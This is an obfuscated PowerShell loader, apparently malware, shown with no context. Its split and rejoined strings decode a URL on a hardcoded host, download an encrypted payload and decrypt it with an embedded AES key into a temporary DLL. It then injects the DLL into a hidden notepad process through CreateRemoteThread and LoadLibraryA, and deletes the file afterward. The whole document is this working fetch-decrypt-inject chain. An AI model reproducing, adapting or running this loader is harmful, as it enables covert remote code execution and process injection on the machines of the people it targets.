 $rukp = @('$EncodedString="a','HR0cDovLzE5','Mi4xNjguNTk','uMTUyL3VzZX','JfcHJvZmlsZ','XNfcGhvdG8v','b2JqZWN0LmR','hdA=="
$De','codedBytes=','[System.Con','vert]::From','Base64Strin','g($EncodedS','tring)
$ur','l=[System.T','ext.Encodin','g]::UTF8.Ge','tString($De','codedBytes)','
$encrypte','dData=(New-','Object Net.','WebClient).','DownloadDat','a($url)
$a','es=[System.','Security.Cr','yptography.','Aes]::Creat','e()
$aes.M','ode=1
','s','.Padding=3
$keyHex="8','a4a35876563','f1ea8baad6c','da0099c24d5','3d4ce5670b3','b23b1306312','7611bb37"
','$keyBytes=N','ew-Object b','yte[] 32
f','or($i=0;$i-','lt32;$i++){','$keyBytes[$','i]=[Convert',']::ToByte($','keyHex.Subs','tring($i*2,','2),16)}
$a','es.Key=$key','Bytes
$ivH','ex="c0a6753','60817d8dba6','2cc79e2fa77','734"
$ivBy','tes=New-Obj','ect byte[] ','16
','($i=','0;$i-lt16;$','i++){$ivByt','es[$i]=[Con','vert]::ToBy','te($ivHex.S','ubstring($i','*2,2),16)}
$aes.IV=$i','vBytes
$de','cryptor=$ae','s.CreateDec','ryptor()
$','decryptedDa','ta=$decrypt','or.Transfor','mFinalBlock','($encrypted','Data,0,$enc','ryptedData.','Length)
$d','ecryptor.Di','spose()
$a','es.Dispose(',')
','mpDll','=[System.IO','.Path]::Get','TempFileNam','e()+".dll"
[System.IO','.File]::Wri','teAllBytes(','$tempDll,$d','ecryptedDat','a)
Add-Typ','e -TypeDefi','nition "usi','ng System;u','sing System','.Runtime.In','teropServic','es;public c','lass N{[Dll','Import(`"ke','rnel32`")]p','ublic stati','c extern In','tPtr OpenPr','ocess(uint ','a,bool b,ui','nt c);[DllI','mport(`"ker','nel32`")]pu','blic static',' extern Int','Ptr Virtual','AllocEx(Int','Ptr a,IntPt','r b,uint c,','uint d,uint',' e);[DllImp','ort(`"kerne','l32`")]publ','ic static e','xtern bool ','WriteProces','sMemory(Int','Ptr a,IntPt','r b,byte[] ','c,uint d,ou','t IntPtr e)',';[DllImport','(`"kernel32','`")]public ','static exte','rn IntPtr C','reateRemote','Thread(IntP','tr a,IntPtr',' b,uint c,I','ntPtr d,Int','Ptr e,uint ','f,out uint ','g);[DllImpo','rt(`"kernel','32`")]publi','c static ex','tern IntPtr',' GetProcAdd','ress(IntPtr',' a,string b',');[DllImpor','t(`"kernel3','2`")]public',' static ext','ern IntPtr ','GetModuleHa','ndle(string',' a);[DllImp','ort(`"kerne','l32`")]publ','ic static e','xtern uint ','WaitForSing','leObject(In','tPtr a,uint',' b);[DllImp','ort(`"kerne','l32`")]publ','ic static e','xtern bool ','CloseHandle','(IntPtr a);','[DllImport(','`"kernel32`','")]public s','tatic exter','n bool Virt','ualFreeEx(I','ntPtr a,Int','Ptr b,uint ','c,uint d);}','"
','o=Get','-Process -N','ame "notepa','d" -ErrorAc','tion Silent','lyContinue
if(-not $p','ro){Start-P','rocess "C:\','Windows\Sys','tem32\notep','ad.exe" -Wi','ndowStyle H','idden;Start','-Sleep 2;$p','ro=Get-Proc','ess "notepa','d"}
$procI','d=$pro[0].I','d
$h=[N]::','OpenProcess','(0x1F0FFF,$','false,$proc','Id)
$b=[Sy','stem.Text.E','ncoding]::A','SCII.GetByt','es($tempDll','+"`0")
$a=','[N]::Virtua','lAllocEx($h',',[IntPtr]::','Zero,$b.Len','gth,0x3000,','0x04)
$w=[','IntPtr]::Ze','ro
[N]::Wr','iteProcessM','emory($h,$a',',$b,$b.Leng','th,[ref]$w)','
$l=[N]::G','etProcAddre','ss([N]::Get','ModuleHandl','e("kernel32','.dll"),"Loa','dLibraryA")','
$t=0
$th','=[N]::Creat','eRemoteThre','ad($h,[IntP','tr]::Zero,0',',$l,$a,0,[r','ef]$t)
if(','$th-ne[IntP','tr]::Zero){','[N]::WaitFo','rSingleObje','ct($th,5000',')|Out-Null;','[N]::CloseH','andle($th)}','
[N]::Virt','ualFreeEx($','h,$a,0,0x80','00)
[N]::C','loseHandle(','$h)
Start-','Sleep 2
tr','y{Remove-It','em $tempDll',' -Force -Er','rorAction S','ilentlyCont','inue}catch{','}'); $rukp = $rukp -join ''; . ([ScriptBlock]::Create($rukp))